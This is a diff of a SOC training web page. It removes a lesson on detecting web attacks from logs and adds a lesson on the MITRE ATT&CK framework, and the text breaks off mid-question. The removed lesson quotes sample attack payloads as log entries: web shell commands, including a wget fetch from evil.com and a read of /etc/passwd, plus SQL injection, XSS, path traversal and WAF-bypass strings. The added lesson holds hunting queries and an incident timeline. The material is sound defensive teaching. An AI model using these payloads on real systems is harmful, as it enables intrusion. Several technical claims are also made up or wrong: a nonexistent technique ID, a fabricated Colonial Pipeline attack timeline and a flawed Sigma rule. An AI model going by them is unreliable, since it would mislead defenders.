@@ -1,69 +1,738 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-warning mb-3"><i class="bi bi-book me-2"></i>Module 8: Web Security Monitoring</h6>
+<h6 class="text-warning mb-3"><i class="bi bi-diagram-2 me-2"></i>Module 8: MITRE ATT&CK Framework</h6>
 
-<p style="color:#c0d0e0;">Web applications are the most attacked vector. This module teaches you to detect web shells, SQL injection, XSS, path traversal, and other web-based attacks from logs and WAF alerts.</p>
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-info-circle me-2"></i>1. SECTION OVERVIEW</h6>
+<p style="color:#c0d0e0;"><strong>What is MITRE ATT&CK?</strong> MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It was created by MITRE Corporation in 2013 and has become the industry-standard framework for describing attacker behavior. ATT&CK organizes attacks into tactics (the "why" — the attacker's goal at each stage) and techniques (the "how" — the specific method used). It covers enterprise environments (Windows, macOS, Linux, cloud, network), mobile platforms, and ICS/OT systems.</p>
+<p style="color:#c0d0e0;"><strong>Why It Matters:</strong> Before ATT&CK, security teams described attacks in inconsistent ways — one team said "the attacker used PowerShell," another said "the attacker executed malicious scripts." There was no common language. ATT&CK provides the common language that unifies the entire security industry. SIEM vendors map their detections to ATT&CK, threat intel reports describe campaigns in ATT&CK terms, and SOC teams measure their coverage against ATT&CK. It bridges the gap between threat intelligence, detection engineering, and incident response.</p>
+<p style="color:#c0d0e0;"><strong>Real-World Use Cases:</strong> A SOC manager asks, "Are we able to detect credential dumping?" — the team checks T1003 (Credential Dumping) techniques and sees which ones have detection rules. A threat intel analyst reads a report about APT29 using T1059.001 (PowerShell), T1134 (Token Manipulation), and T1087 (Account Discovery) — they correlate these with SIEM logs to hunt for the same behavior. A detection engineer maps existing Sigma rules to ATT&CK IDs and discovers they cover only 40% of enterprise techniques — they prioritize writing rules for the uncovered techniques. A penetration testing report says "We successfully used T1055.012 (Process Hollowing)" — the blue team validates detection coverage and tunes rules.</p>
+<p style="color:#c0d0e0;"><strong>Skills Gained:</strong> Navigating the ATT&CK matrix; mapping adversary behavior to techniques; using ATT&CK Navigator; integrating ATT&CK into detection rules; performing ATT&CK-based threat hunting; measuring detection coverage using ATT&CK; communicating threat intelligence using ATT&CK taxonomy.</p>
+<p style="color:#c0d0e0;"><strong>Prerequisites:</strong> Understanding of the cyber kill chain, common attack types, basic familiarity with Windows and Linux operating systems.</p>
+<p style="color:#c0d0e0;"><strong>Learning Objectives:</strong> (1) Navigate the MITRE ATT&CK framework and explain tactics, techniques, procedures, and sub-techniques, (2) Map real-world adversary behavior to specific ATT&CK technique IDs, (3) Use ATT&CK Navigator to visualize detection coverage, (4) Integrate ATT&CK IDs into SIEM detection rules and Sigma rules, (5) Perform ATT&CK-based threat hunting and gap analysis, (6) Communicate threat intelligence using standardized ATT&CK taxonomy.</p>
 
-<h6 class="text-warning mt-3">Sub-Domains / Rooms</h6>
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-journal-text me-2"></i>2. DETAILED NOTES</h6>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Detecting Web Shells</p>
-<p style="color:#c0d0e0;">A web shell is a malicious script uploaded to a web server that gives attackers remote control. They can execute system commands, browse files, and pivot to internal networks.</p>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 1: ATT&CK Structure — Tactics, Techniques, Sub-Techniques, and Procedures</p>
+<p style="color:#c0d0e0;">The MITRE ATT&CK framework is organized hierarchically. Understanding this structure is essential for using ATT&CK effectively in any SOC role. The framework describes adversarial behavior from the highest level (tactics) down to the most specific level (procedures).</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Common Web Shell Detection Methods:</b><br><br>
-<b>1. File Upload Monitoring:</b><br>
-Check web server access logs for file uploads:<br>
-<code>192.168.1.100 - - [21/May/2026:14:32:15 +0000] "POST /uploads/ HTTP/1.1" 200 234 "-" "Mozilla/5.0"</code><br>
-If followed by GET requests to the uploaded file with cmd parameters, it's a web shell.<br><br>
-<b>2. Command Execution Detection:</b><br>
-<code>GET /uploads/shell.php?cmd=id HTTP/1.1" 200<br>
-GET /uploads/shell.php?cmd=ls%20-la HTTP/1.1" 200<br>
-GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200<br>
-GET /uploads/shell.php?cmd=wget%20http://evil.com/tools.sh HTTP/1.1" 200</code><br>
-Pattern: Same file accessed with different cmd= parameters — clear web shell behavior.<br><br>
-<b>3. WAF Detection:</b><br>
-WAF rules typically detect: <code>Request URI contains "cmd=" OR "exec=" OR "shell="</code> combined with suspicious extensions (.php, .asp, .jsp) in upload directories.<br><br>
-<b>4. File Integrity Monitoring:</b><br>
-Use tools like OSSEC or Tripwire to alert when files in web directories change unexpectedly.
+<b>ATT&CK Hierarchy (Top to Bottom):</b><br><br>
+<b>Tactics:</b> The "why" — the adversary's goal or objective at each stage of an attack. There are 14 tactics in the Enterprise ATT&CK matrix. Each tactic represents a phase in the attack lifecycle.<br>
+<em>Enterprise Tactics (ordered left to right in the matrix):</em><br>
+1. <b>Reconnaissance (TA0043):</b> Gathering information to plan future operations (active scanning, social engineering).<br>
+2. <b>Resource Development (TA0042):</b> Establishing infrastructure and resources (buy domains, compromise accounts, develop tools).<br>
+3. <b>Initial Access (TA0001):</b> Getting into the network (phishing, external remote services, valid accounts).<br>
+4. <b>Execution (TA0002):</b> Running malicious code (PowerShell, command line, user execution).<br>
+5. <b>Persistence (TA0003):</b> Maintaining access through restarts or credential changes (registry Run keys, scheduled tasks, services).<br>
+6. <b>Privilege Escalation (TA0004):</b> Gaining higher-level permissions (token manipulation, process injection, bypass UAC).<br>
+7. <b>Defense Evasion (TA0005):</b> Avoiding detection (disabling security tools, obfuscation, file deletion).<br>
+8. <b>Credential Access (TA0006):</b> Stealing account names and passwords (keylogging, LSASS dump, brute force).<br>
+9. <b>Discovery (TA0007):</b> Figuring out the environment (account discovery, file/directory discovery, system network discovery).<br>
+10. <b>Lateral Movement (TA0008):</b> Moving through the network (RDP, SMB/Windows Admin Shares, SSH).<br>
+11. <b>Collection (TA0009):</b> Gathering data of interest (email collection, clipboard data, screen capture).<br>
+12. <b>Command and Control (TA0011):</b> Communicating with compromised systems (C2 protocol, ingress tool transfer, proxy).<br>
+13. <b>Exfiltration (TA0010):</b> Stealing data (exfiltration over C2 channel, scheduled transfer, data transfer size limits).<br>
+14. <b>Impact (TA0040):</b> Manipulating, interrupting, or destroying systems (data destruction, ransomware, defacement).<br><br>
+<b>Techniques:</b> The "how" — the specific method used to achieve a tactic. Each tactic contains multiple techniques. Example: Under "Execution (TA0002)" there are 10+ techniques including: T1059 (Command and Scripting Interpreter), T1204 (User Execution), T1053 (Scheduled Task/Job), T1569 (System Services).<br><br>
+<b>Sub-Techniques:</b> More specific variants of a technique. Example: T1059 (Command and Scripting Interpreter) has sub-techniques: T1059.001 (PowerShell), T1059.002 (AppleScript), T1059.003 (Windows Command Shell), T1059.005 (Visual Basic), T1059.006 (Python), T1059.007 (JavaScript/JScript).<br><br>
+<b>Procedures:</b> The specific implementations of techniques used by particular threat actors or malware. Example: APT29 uses PowerShell (T1059.001) for execution, while LockBit ransomware uses cmd.exe (T1059.003) for running vssadmin.exe. Procedures are not included in the ATT&CK matrix itself but are described in threat intelligence reports.<br><br>
+<b>ATT&CK ID Format:</b><br>
+- Tactics: TA0001 through TA0043<br>
+- Techniques: T1003 through T1600+<br>
+- Sub-Techniques: T1003.001 through T1600.xxx<br><br>
+<b>Navigating the MITRE ATT&CK Matrix:</b><br>
+The ATT&CK Matrix is displayed as a grid with tactics as columns and techniques as rows. The number under each tactic indicates how many techniques exist for that tactic. Currently (v14): 14 tactics, 200+ techniques, 400+ sub-techniques. The official ATT&CK website (attack.mitre.org) provides the interactive matrix, detailed pages for each technique, examples of real-world usage, detection suggestions, and mitigation recommendations.<br><br>
+<b>ATT&CK for Different Platforms:</b><br>
+- <b>Enterprise ATT&CK:</b> Windows, macOS, Linux, Azure AD, Office 365, Google Workspace, SaaS, IaaS, Network<br>
+- <b>Mobile ATT&CK:</b> Android and iOS<br>
+- <b>ICS ATT&CK:</b> Industrial Control Systems (SCADA, PLC, DCS)<br>
+<br>
+<b>Real-World Example — Mapping an Attack to ATT&CK:</b><br>
+Consider the Colonial Pipeline ransomware attack in 2021:<br>
+1. <b>Initial Access (TA0001):</b> Attacker used compromised VPN credentials (T1078 — Valid Accounts) on a legacy system without MFA.<br>
+2. <b>Execution (TA0002):</b> Deployed ransomware via PowerShell (T1059.001 — PowerShell) and command line (T1059.003 — Windows Command Shell).<br>
+3. <b>Persistence (TA0003):</b> Created scheduled tasks (T1053.005 — Scheduled Task) to maintain access.<br>
+4. <b>Privilege Escalation (TA0004):</b> Used token manipulation (T1134 — Access Token Manipulation) to gain admin rights.<br>
+5. <b>Defense Evasion (TA0005):</b> Disabled security logging (T1562.001 — Impair Defenses: Disable or Modify Tools).<br>
+6. <b>Lateral Movement (TA0008):</b> Used RDP (T1021.001 — Remote Desktop Protocol) to move from IT to OT network.<br>
+7. <b>Collection (TA0009):</b> Exfiltrated data from file servers (T1005 — Data from Local System).<br>
+8. <b>Command and Control (TA0011):</b> Used encrypted C2 channel (T1572 — Protocol Tunneling).<br>
+9. <b>Exfiltration (TA0010):</b> Exfiltrated data over C2 channel (T1041 — Exfiltration Over C2 Channel).<br>
+10. <b>Impact (TA0040):</b> Encrypted data (T1486 — Data Encrypted for Impact) causing operational shutdown.
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Web Attack Investigation Rooms</p>
-<p style="color:#c0d0e0;">Practice investigating SQL injection, XSS, path traversal, SSRF, and file upload vulnerabilities from logs.</p>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 2: Using ATT&CK in the SOC — Detection Coverage and Gap Analysis</p>
+<p style="color:#c0d0e0;">ATT&CK is most powerful when used as a measurement tool for detection coverage. By mapping every detection rule to specific ATT&CK techniques, you can visualize which parts of the attack lifecycle you can detect and — more importantly — which parts you're blind to. This enables data-driven decisions about where to invest in new rules, tools, or log sources.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>SQL Injection Investigation:</b><br>
-You receive a WAF alert: "SQL Injection Attempt Blocked"<br>
-Check the web access log:<br>
-<code>GET /products?id=1'+OR+'1'%3D'1 HTTP/1.1" 200<br>
-GET /products?id=1'+UNION+SELECT+null,null,null-- HTTP/1.1" 200<br>
-GET /products?id=1'+UNION+SELECT+@@version,null,null-- HTTP/1.1" 200</code><br><br>
-<b>Analysis:</b> The attacker tested basic SQLi with OR 1=1 (page returned 200 = vulnerable), then used UNION SELECT to enumerate columns, then tried to extract database version.<br>
-<b>Detection SPL (Splunk):</b><br>
-<code>index=webserver | search uri=*products* AND uri=*UNION* OR uri=*OR*1=1*<br>
-| stats count by src_ip, uri | where count > 3</code><br><br>
-<b>XSS Investigation:</b><br>
-<code>GET /search?q=&lt;script&gt;alert('xss')&lt;/script&gt; HTTP/1.1" 200<br>
-GET /search?q=&lt;img+src=x+onerror=alert('xss')&gt; HTTP/1.1" 200<br>
-GET /search?q=&lt;svg+onload=alert('xss')&gt; HTTP/1.1" 200</code><br><br>
-<b>Analysis:</b> Attacker testing reflected XSS by injecting different HTML/JavaScript payloads into the search parameter. The page returned 200 with the script rendered — vulnerability confirmed.<br>
-<b>Detection:</b> WAF rule blocking <code>&lt;script&gt;</code>, <code>onerror=</code>, <code>onload=</code> patterns in request parameters.<br><br>
-<b>Path Traversal Investigation:</b><br>
-<code>GET /../../../../etc/passwd HTTP/1.1" 200<br>
-GET /../../../windows/system32/drivers/etc/hosts HTTP/1.1" 200<br>
-GET /..%2e..%2e..%2e..%2eetc/passwd HTTP/1.1" 200</code><br><br>
-<b>Analysis:</b> Attacker used ../ sequences and URL-encoded variants (%2e%2e/) to navigate outside the web root and read system files.<br>
-<b>WAF Bypass Attempts:</b><br>
-- Double URL encoding: <code>%252e%252e%252f</code> (WAF decodes once, web server decodes again)<br>
-- Unicode encoding: <code>..%c0%ae%c0%ae/</code> (IIS unicode vulnerability)<br>
-- Using \\ instead of /: <code>..\\..\\..\\windows\\win.ini</code>
+<b>Building a Detection Coverage Matrix:</b><br>
+Step 1: Inventory every detection rule in your SIEM. For each rule, document:<br>
+- Rule name, SIEM platform, rule type (Sigma, custom SPL, YARA, etc.)<br>
+- MITRE ATT&CK technique ID(s) it maps to<br>
+- Log source required (Sysmon EID 1, Windows EID 4624, etc.)<br>
+- Current status (enabled/disabled/test)<br>
+- Last tested date<br>
+- True positive rate (TPs / Total alerts)<br><br>
+Step 2: Create a matrix with tactics as columns and techniques as rows. Mark each cell:<br>
+- <b>Green:</b> Covered — rule exists, tested, working, acceptable FP rate<br>
+- <b>Yellow:</b> Partial — rule exists but has high FP rate, or rule exists but log source is incomplete<br>
+- <b>Red:</b> Not covered — no rule exists, or rule exists but log source not available<br>
+- <b>Gray:</b> Not applicable — technique doesn't apply to your environment (e.g., macOS-only techniques in a Windows environment)<br><br>
+Step 3: Calculate coverage percentage: (Covered + Partial) / Total Techniques.<br>
+Target for mature SOC: 60%+ covered, 25% partial, 15% max uncovered.<br><br>
+<b>ATT&CK Navigator:</b><br>
+MITRE's official tool for visualizing detection coverage. You can upload a layer file (JSON) describing coverage:<br>
+<code>{<br>
+  "name": "SOC Detection Coverage",<br>
+  "techniques": [<br>
+    {"techniqueID": "T1059.001", "color": "#00ff00", "comment": "Covered by Sysmon EID 1 rule"},<br>
+    {"techniqueID": "T1003.001", "color": "#ffff00", "comment": "Partial — needs tuning"},<br>
+    {"techniqueID": "T1486", "color": "#ff0000", "comment": "No coverage — need rule"}<br>
+  ]<br>
+}</code><br><br>
+The Navigator generates a heatmap showing exactly where you have detection gaps. You can overlay multiple layers (e.g., detection coverage vs threat actor usage) to prioritize which gaps to fill first.<br><br>
+<b>Gap Analysis Prioritization:</b><br>
+When deciding which uncovered techniques to address first, consider:<br>
+1. <b>Prevalence:</b> How common is this technique? Check Verizon DBIR, MITRE ATT&CK evaluations, threat intel reports. Prioritize techniques used by top threat actors targeting your industry.<br>
+2. <b>Impact:</b> How damaging is this technique if successful? Ransomware (T1486) and credential theft (T1003) have high impact.<br>
+3. <b>Detectability:</b> Can you detect this technique with current log sources? If not, what new log source is needed?<br>
+4. <b>Ease of Implementation:</b> How hard is it to write a rule? Some techniques are straightforward (detect vssadmin.exe), others require complex logic.<br>
+5. <b>Coverage Breadth:</b> Does detecting this technique also cover other techniques? (E.g., detecting all process creation via Sysmon EID 1 covers dozens of techniques).<br><br>
+<b>Real-World Gap Analysis Example:</b><br>
+A mid-size SOC runs the ATT&CK Navigator with their detection rules:<br>
+Total Enterprise Techniques: 200<br>
+Covered (Green): 82 (41%)<br>
+Partial (Yellow): 45 (22.5%)<br>
+Not Covered (Red): 73 (36.5%)<br><br>
+Top 10 Uncovered Techniques by Risk:<br>
+| ID | Technique | Priority | Reason |
+|---|-----------|----------|--------|
+| T1059.001 | PowerShell | Critical | Used in 90%+ of attacks, but rule was disabled due to FPs |
+| T1003.001 | LSASS Memory | Critical | No Sysmon EID 10 — need to deploy updated Sysmon config |
+| T1486 | Data Encrypted | High | Rule exists but only for known extensions — needs update |
+| T1021.001 | RDP Lateral Movement | High | Need to enable more detailed RDP logging |
+| T1547.001 | Registry Run Keys | Medium | Rule exists but log source not forwarding correctly |
+| ... | ... | ... | ... |<br><br>
+Action items: (1) Re-tune PowerShell rule with exceptions, (2) Deploy updated Sysmon config for EID 10, (3) Update ransomware rule with latest extensions, (4) Enable RDP audit logging via GPO, (5) Fix log forwarding for Registry events.
 </div>
 
-<h6 class="text-warning mt-3">Web Attack Investigation Playbook</h6>
+<p style="color:#00d4ff;font-weight:600;">Subtopic 3: Mapping Real-World Threat Actors to ATT&CK</p>
+<p style="color:#c0d0e0;">MITRE ATT&CK is used to describe threat actor behavior — specific groups (APTs, cybercriminal gangs) have characteristic TTPs that can be mapped to ATT&CK techniques. This mapping enables proactive threat hunting: if a known adversary is reported using specific techniques, you can hunt for those specific behaviors in your environment. ATT&CK also provides "Software" entries — specific malware and tools used by adversaries.</p>
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>When investigating a web attack alert, follow these steps:</b><br><br>
-1. <b>Identify the attacker IP:</b> Check source IP in the alert, look up in threat intel (VirusTotal, AbuseIPDB)<br>
-2. <b>Determine the attack type:</b> Is it SQLi, XSS, path traversal, file upload, SSRF, or something else?<br>
-3. <b>Check if the attack succeeded:</b> Did the server return 200 (success) or 403/500 (blocked)?<br>
-4. <b>Find what was accessed:</b> Look for subsequent requests — did they read files, download tools, or extract data?<br>
-5. <b>Assess impact:</b> Check database logs for data extraction, check for new user accounts, check outbound traffic for exfiltration<br>
-6. <b>Containment:</b> Block attacker IP, patch vulnerability (input validation, parameterized queries), rotate any exposed credentials<br>
-7. <b>Forensic evidence:</b> Save web server logs, WAF logs, and database logs before they rotate
+<b>ATT&CK Groups:</b><br>
+MITRE tracks over 150+ threat groups with documented TTPs. Each group has a detailed page listing all techniques they've been observed using.<br><br>
+<b>Example — APT29 (Cozy Bear):</b><br>
+Russian state-sponsored group attributed to the SVR. Known for SolarWinds compromise (2020), DNC hack (2016).<br>
+<em>Characteristic TTPs:</em><br>
+- T1059.001 — PowerShell: Used for execution and C2 communication<br>
+- T1071.001 — Web Protocols: HTTPS for C2 (web shells)<br>
+- T1090.003 — Multi-hop Proxy: Using multiple proxies to obscure C2<br>
+- T1003.001 — LSASS Memory: Credential dumping via Mimikatz<br>
+- T1021.002 — SMB/Windows Admin Shares: Lateral movement<br>
+- T1505.003 — Web Shell: Installed on Exchange servers<br>
+- T1053.005 — Scheduled Task: Persistence via scheduled tasks<br>
+- T1566.001 — Spearphishing Attachment: Initial access via malicious attachments<br><br>
+<b>Example — Lazarus Group (HIDDEN COBRA / APT38):</b><br>
+North Korean state-sponsored group. Known for Sony Pictures hack (2014), Bangladesh Bank heist (2016), WannaCry (2017).<br>
+<em>Characteristic TTPs:</em><br>
+- T1204.002 — User Execution: Malicious file execution via social engineering<br>
+- T1059.003 — Windows Command Shell: cmd.exe for system commands<br>
+- T1059.005 — Visual Basic: VBA macros in phishing documents<br>
+- T1027 — Obfuscated Files or Information: Custom packers and encrypted payloads<br>
+- T1566.001 — Spearphishing Attachment: Initial access via targeted phishing<br>
+- T1041 — Exfiltration Over C2 Channel: Data exfiltration via C2<br>
+- T1486 — Data Encrypted for Impact: Ransomware (wiped variant)<br>
+- T1203.002 — Exploitation for Client Execution: Flash, Office vulnerabilities<br><br>
+<b>ATT&CK Software:</b><br>
+MITRE also catalogs specific software (malware, tools) used by adversaries. Each software has documented TTPs.<br><br>
+<b>Example — Cobalt Strike:</b><br>
+Legitimate penetration testing tool, heavily abused by cybercriminals and APTs.<br>
+- T1055.012 — Process Hollowing: Injects into legitimate processes<br>
+- T1055.001 — DLL Injection: Injects Cobalt Strike DLL<br>
+- T1573.001 — Encrypted Channel: Encrypted C2 communication<br>
+- T1095 — Non-Application Layer Protocol: Uses TCP for C2<br>
+- T1059.003 — Windows Command Shell: Executes commands on target<br>
+- T1057 — Process Discovery: Lists running processes<br>
+- T1082 — System Information Discovery: Enumerates system info<br>
+- JA3 fingerprint: Cobalt Strike has distinctive TLS fingerprint (e.g., 72a589da586844d7f0818ce684948b13)<br><br>
+<b>Threat Actor TTP-based Hunting Example:</b><br>
+CISA releases an alert: "APT29 is actively targeting healthcare organizations, using spearphishing with malicious Excel documents (T1566.001), macro-enabled PowerShell download cradle (T1059.001), and C2 via web shells on IIS servers (T1505.003)."<br><br>
+<em>Your SOC hunting actions:</em><br>
+1. Search for Excel spawning PowerShell: <code>index=process_creation ParentImage|endswith='EXCEL.EXE' Image|endswith='powershell.exe'</code><br>
+2. Search for unusual .aspx files in web directories (web shells): <code>index=filesystem FileName|endswith='.aspx' Path|contains='\inetpub\wwwroot\'</code><br>
+3. Search for IIS worker processes making outbound connections: <code>index=network Image|contains='w3wp.exe' dest_port=443</code><br>
+4. Search for scheduled tasks created recently on web servers: <code>index=windows EventCode=4698 ComputerName|contains='WEB'</code><br><br>
+<b>ATT&CK for Incident Response:</b><br>
+During an incident, map every attacker action to ATT&CK techniques. This creates a standardized incident timeline that can be shared with partners, law enforcement, and threat intel sharing communities. It also helps identify: which defenses were bypassed? Which techniques did we fail to detect? What new rules do we need?<br><br>
+<b>Example IR Timeline (ATT&CK-Mapped):</b><br>
+| Time | Action | ATT&CK ID | Technique Name | Detected? |
+|------|--------|-----------|---------------|-----------|
+| 02:00 | Phishing email sent to user | T1566.002 | Spearphishing Link | No (EM failed to detect) |
+| 02:05 | User clicked link, downloaded .js | T1204.002 | Malicious File | Yes (AV alerted) |
+| 02:06 | PowerShell executed via WScript | T1059.001 | PowerShell | No (old Sysmon config) |
+| 02:07 | C2 beacon to evil.com:443 | T1071.001 | Web Protocols | No (proxy allowed) |
+| 02:30 | Dumped LSASS credentials | T1003.001 | LSASS Memory | No (no EID 10) |
+| 03:00 | RDP to DC01 | T1021.001 | RDP | Yes (GeoIP alert) |
+| 03:15 | Created scheduled task | T1053.005 | Scheduled Task | No (rule disabled) |
+| 03:30 | Exfiltrated data over C2 | T1041 | C2 Exfiltration | No (no DLP) |
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Subtopic 4: ATT&CK-Based Detection Engineering and Mitigation Mapping</p>
+<p style="color:#c0d0e0;">Every ATT&CK technique page provides detection suggestions and mitigation recommendations. This makes ATT&CK an invaluable resource for detection engineers — you don't need to figure out detection from scratch. The framework tells you what to look for, what log source to use, and what mitigations to apply. Integrating this directly into your detection engineering process ensures you're following industry best practices.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Using ATT&CK Technique Pages for Detection Engineering:</b><br>
+Each technique page at attack.mitre.org includes these sections that directly inform detection engineering:<br><br>
+<b>1. Detection:</b> Concrete suggestions for detecting the technique. Example from T1003.001 (LSASS Memory):<br>
+"Monitor for calls to LSASS from unusual processes. Use Sysmon Event ID 10 (ProcessAccess) to detect process access to lsass.exe. Look for unusual access patterns, particularly by processes not typically accessing LSASS (e.g., cmd.exe, notepad.exe, or unknown executables). Windows Event ID 4654 (A handle to an object was requested) can also detect LSASS access attempts."<br><br>
+<b>2. Mitigations:</b> Preventive measures to reduce the technique's effectiveness. Example from T1003.001:<br>
+- <b>M1028 — Operating System Configuration:</b> Enable Credential Guard to protect LSASS<br>
+- <b>M1043 — Privileged Account Management:</b> Limit local admin rights<br>
+- <b>M1047 — Audit:</b> Enable advanced audit policies for process access attempts<br>
+- <b>M1026 — Privileged Account Management:</b> Use Protected Process Light (PPL) for LSASS<br><br>
+<b>3. Data Sources:</b> What log sources are needed. Example for T1003.001:<br>
+- Process: Process access (Sysmon EID 10), Process creation (Sysmon EID 1)<br>
+- Windows: Windows Event Log (EID 4654)<br>
+- API: Windows API calls (ETW)<br><br>
+<b>4. Examples:</b> Real-world examples of the technique being used by threat actors. This helps you validate your detection rules against known attacker behavior.<br><br>
+<b>Building MITRE-Based Detection Rules — Step by Step:</b><br>
+Let's walk through creating a rule for T1055.012 (Process Hollowing):<br><br>
+<b>Step 1 — Research:</b> Visit attack.mitre.org/techniques/T1055/012/. Read description: "Adversaries may inject malicious code into a process via process hollowing. Process hollowing is a method in which a malicious process creates a process in a suspended state, then unmaps/hollows its memory and replaces it with malicious code."<br><br>
+<b>Step 2 — Review Detection Suggestions:</b><br>
+- "Monitor for process creation with parameters indicating suspended process creation such as CREATE_SUSPENDED"<br>
+- "Monitor for processes being created from unknown parent processes"<br>
+- "Monitor for abnormal behavior of target processes that may indicate process injection"<br><br>
+<b>Step 3 — Check Data Sources:</b><br>
+- Process: Process creation (Windows EID 4688, Sysmon EID 1)<br>
+- Process: OS API Execution — NtCreateProcess, NtCreateThreadEx<br>
+- Windows: Windows Event Log (EID 4688 includes command line)<br><br>
+<b>Step 4 — Write Sigma Rule:</b><br>
+<code>title: Process Hollowing — Suspended Process Creation<br>
+logsource: product: windows, category: process_creation<br>
+detection: selection: CommandLine|contains: 'CREATE_SUSPENDED'<br>
+condition: selection<br>
+falsepositives: Legitimate debugging tools, development environments<br>
+level: high</code><br><br>
+<b>Step 5 — Test:</b> Execute Atomic Red Team T1055.012 and verify detection.<br><br>
+<b>MITRE ATT&CK for SOC Automation:</b><br>
+You can automate ATT&CK-based workflows:<br>
+- <b>Automated Coverage Reports:</b> Weekly script that exports SIEM rules → maps to ATT&CK → generates coverage report → emails to SOC manager<br>
+- <b>Automated Threat Intel Integration:</b> When new threat intel report arrives with ATT&CK IDs → auto-hunt for those techniques across last 30 days of data<br>
+- <b>Automated Playbook Trigger:</b> When an alert fires with ATT&CK tag for T1486 (ransomware) → auto-activate ransomware playbook (isolate host, block SMB, page IR team)<br><br>
+<b>ATT&CK in Compliance and Audit:</b><br>
+Regulatory frameworks increasingly reference ATT&CK. PCI DSS 4.0's requirement for "automated monitoring of all access" can be demonstrated by showing ATT&CK coverage. SOC 2 auditors accept ATT&CK-based coverage reports as evidence of security monitoring capabilities. Many cyber insurance policies now ask: "What percentage of MITRE ATT&CK techniques are you able to detect?"<br><br>
+<b>Common Misconceptions About ATT&CK:</b><br>
+- ❌ "ATT&CK is just a checklist" — It's a framework for understanding adversary behavior, not a compliance checkbox<br>
+- ❌ "Covering all techniques means you're secure" — Detection is only one layer; prevention and response matter too<br>
+- ❌ "ATT&CK doesn't cover custom attacks" — It covers TTPs, not specific malware — custom attacks still use known techniques<br>
+- ❌ "Only large SOCs need ATT&CK" — Even small teams benefit from the common language and structured approach<br>
+- ❌ "ATT&CK is too complex" — Start with common techniques (top 20), expand coverage gradually
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-box-seam me-2"></i>3. CONCEPT BOXES</h6>
+
+<div class="alert alert-info">
+<strong>INFO BOX</strong><br>
+<b>ATT&CK vs Cyber Kill Chain vs Diamond Model:</b> These are complementary frameworks, not competing. The <b>Cyber Kill Chain</b> (Lockheed Martin, 2011) describes 7 phases of an attack from reconnaissance to actions on objectives — it's simpler but linear and doesn't capture parallel/looping behavior. The <b>Diamond Model</b> describes the relationships between four core components of any intrusion: adversary, capability, infrastructure, and victim — it focuses on the "who" and "what" of an intrusion. <b>MITRE ATT&CK</b> is the most detailed — it describes specific techniques within each phase, enabling precise detection engineering. Best practice: Use Kill Chain for executive briefings (simple, easy to understand), Diamond Model for threat intelligence analysis (relationship-focused), and ATT&CK for detection engineering and SOC operations (technique-focused).
+</div>
+
+<div class="alert alert-success">
+<strong>REMEMBER BOX</strong><br>
+<b>ATT&CK IDs Are Your Universal Language.</b> When communicating about security incidents, always use ATT&CK IDs. Instead of saying "The attacker used PowerShell to run malicious code," say "The attacker used T1059.001 (PowerShell) for execution." Instead of "They dumped passwords," say "They performed T1003.001 (LSASS Memory credential dumping)." This precision ensures that any security professional — regardless of vendor, tool, or background — immediately understands exactly what happened. It also enables automated correlation: if your SIEM tags alerts with ATT&CK IDs, you can automatically query "show me all incidents involving T1059.001" and get consistent results.
+</div>
+
+<div class="alert alert-warning">
+<strong>WARNING BOX</strong><br>
+<b>Avoid "ATT&CK Washing" — Over-Hyping Coverage.</b> Some security vendors claim "100% ATT&CK coverage" or map every feature to a technique. This is misleading. Having a marketing slide that maps to T1003.001 doesn't mean your SIEM actually detects Mimikatz usage in a real environment. Real coverage requires: the right log source actually sending data, a properly written and tuned detection rule, and validated testing with real adversary behavior. Don't confuse "we have a rule for this technique" with "we can detect this technique." Validate, test, measure, and tune — continuously.
+</div>
+
+<div class="alert alert-info">
+<strong>SOC ANALYST TIP</strong><br>
+<b>Use ATT&CK Navigator Layers for Shift Handoffs.</b> Export your current detection coverage as an ATT&CK Navigator layer before each shift handoff. The incoming analyst can see at a glance: which techniques are covered (green), which have known issues (yellow), and which are being actively hunted (annotated). Attach the layer file to the shift handoff ticket. This takes 30 seconds and provides the entire SOC team with a shared understanding of current detection posture. Bonus: track coverage changes over time by saving daily layer snapshots.
+</div>
+
+<div class="alert alert-warning">
+<strong>INTERVIEW Q&A</strong><br>
+<b>Q: "Explain how you would use MITRE ATT&CK to improve a SOC that currently doesn't use any framework."</b><br>
+<b>A:</b> "I'd start with a three-phase approach. Phase 1 — Baseline: Export all existing detection rules, map each to the corresponding ATT&CK technique ID. Build a coverage matrix using ATT&CK Navigator. This shows the current state. Phase 2 — Prioritize: Identify the top 10 uncovered techniques based on threat intel (what techniques are most commonly used against our industry) and business risk (which techniques would cause the most damage). Phase 3 — Improve: Write detection rules for the top 10 gaps. After each rule is deployed and tested, update the coverage heatmap. Rinse and repeat — every quarter, run this cycle to expand coverage. Also train the team: teach them to use ATT&CK IDs in incident reports, in communication, and in playbooks. Within 6 months, the SOC should be at 40%+ coverage and speaking a common language."<br><br>
+<b>Q: "How would you use ATT&CK to prioritize which security tools to purchase?"</b><br>
+<b>A:</b> "I'd build a coverage heatmap of our current detection capabilities. Then I'd overlay threat actor techniques relevant to our industry. The gaps show me what I can't detect. If I see a cluster of uncovered techniques in the 'Initial Access' tactic that all require phishing protection, I know I need an email security solution. If I see gaps in 'Lateral Movement' that require endpoint telemetry, I know I need better EDR. The key is coverage gap analysis + threat actor relevance. For example: if the top threat actor targeting our industry (say a healthcare APT) heavily uses T1059.001 (PowerShell), and we have poor PowerShell logging, I'd invest in PowerShell script block logging (free) and detection rules before buying a new $100K tool."<br><br>
+<b>Q: "What are the limitations of MITRE ATT&CK that analysts should be aware of?"</b><br>
